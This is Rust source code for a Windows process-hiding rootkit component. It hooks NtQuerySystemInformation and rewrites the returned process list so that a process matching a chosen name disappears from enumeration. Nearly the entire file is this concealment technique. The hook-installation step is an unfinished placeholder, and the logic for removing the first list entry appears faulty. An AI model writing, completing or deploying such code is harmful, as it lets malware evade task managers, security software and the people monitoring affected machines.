use std::ffi::c_void;
use std::ptr;
use windows::Win32::System::Threading::GetCurrentThread;
use windows::core::PWSTR;

// NT API structures
#[repr(C)]
pub struct UNICODE_STRING {
    pub length: u16,
    pub maximum_length: u16,
    pub buffer: PWSTR,
}

#[repr(C)]
pub struct SYSTEM_PROCESS_INFORMATION {
    pub next_entry_offset: u32,
    pub number_of_threads: u32,
    pub working_set_private_size: i64,
    pub hard_fault_count: u32,
    pub number_of_threads_high_watermark: u32,
    pub cycle_time: u64,
    pub create_time: i64,
    pub user_time: i64,
    pub kernel_time: i64,
    pub image_name: UNICODE_STRING,
    // ... more fields (we only need the ones above)
}

pub type NTSTATUS = i32;

pub type NtQuerySystemInformationFn = unsafe extern "system" fn(
    system_information_class: u32,
    system_information: *mut c_void,
    system_information_length: u32,
    return_length: *mut u32,
) -> NTSTATUS;

static mut ORIGINAL_NT_QUERY: Option<NtQuerySystemInformationFn> = None;
static mut HIDDEN_PROCESS_NAME: Option<String> = None;

pub unsafe extern "system" fn hooked_nt_query_system_information(
    system_information_class: u32,
    system_information: *mut c_void,
    system_information_length: u32,
    return_length: *mut u32,
) -> NTSTATUS {
    let original = ORIGINAL_NT_QUERY.unwrap();
    let status = original(
        system_information_class,
        system_information,
        system_information_length,
        return_length,
    );

    // SystemProcessInformation = 5
    if system_information_class == 5 && !system_information.is_null() {
        if let Some(ref hidden_name) = HIDDEN_PROCESS_NAME {
            let mut current = system_information as *mut SYSTEM_PROCESS_INFORMATION;
            let mut previous: *mut SYSTEM_PROCESS_INFORMATION = ptr::null_mut();

            loop {
                if (*current).image_name.buffer.0 != ptr::null_mut() {
                    let name_slice = std::slice::from_raw_parts(
                        (*current).image_name.buffer.0,
                        ((*current).image_name.length / 2) as usize,
                    );
                    let process_name = String::from_utf16_lossy(name_slice).to_lowercase();

                    if process_name.contains(&hidden_name.to_lowercase()) {
                        // Hide this process
                        if previous.is_null() {
                            // First entry, skip it
                            if (*current).next_entry_offset != 0 {
                                let next = (current as *mut u8).add((*current).next_entry_offset as usize)
                                    as *mut SYSTEM_PROCESS_INFORMATION;
                                ptr::copy(next, current, 1);
                            }
                        } else {
                            // Not first entry, link previous to next
                            (*previous).next_entry_offset += (*current).next_entry_offset;
                        }
                    }
                }

                if (*current).next_entry_offset == 0 {
                    break;
                }

                previous = current;
                current = (current as *mut u8).add((*current).next_entry_offset as usize)
                    as *mut SYSTEM_PROCESS_INFORMATION;
            }
        }
    }

    status
}

pub fn set_hidden_process_name(name: &str) {
    unsafe {
        HIDDEN_PROCESS_NAME = Some(name.to_string());
    }
}

pub fn install_hook() -> Result<(), String> {
    unsafe {
        let ntdll = windows::Win32::System::LibraryLoader::GetModuleHandleW(
            windows::core::w!("ntdll.dll")
        ).map_err(|e| format!("Failed to get ntdll handle: {:?}", e))?;

        let proc_addr = windows::Win32::System::LibraryLoader::GetProcAddress(
            ntdll,
            windows::core::s!("NtQuerySystemInformation")
        ).ok_or("Failed to get NtQuerySystemInformation address")?;

        ORIGINAL_NT_QUERY = Some(std::mem::transmute(proc_addr));

        // TODO: Use retour-rs to install the hook
        // For now, this is a placeholder
        
        Ok(())
    }
}

pub fn remove_hook() -> Result<(), String> {
    unsafe {
        ORIGINAL_NT_QUERY = None;
        HIDDEN_PROCESS_NAME = None;
    }
    Ok(())
}
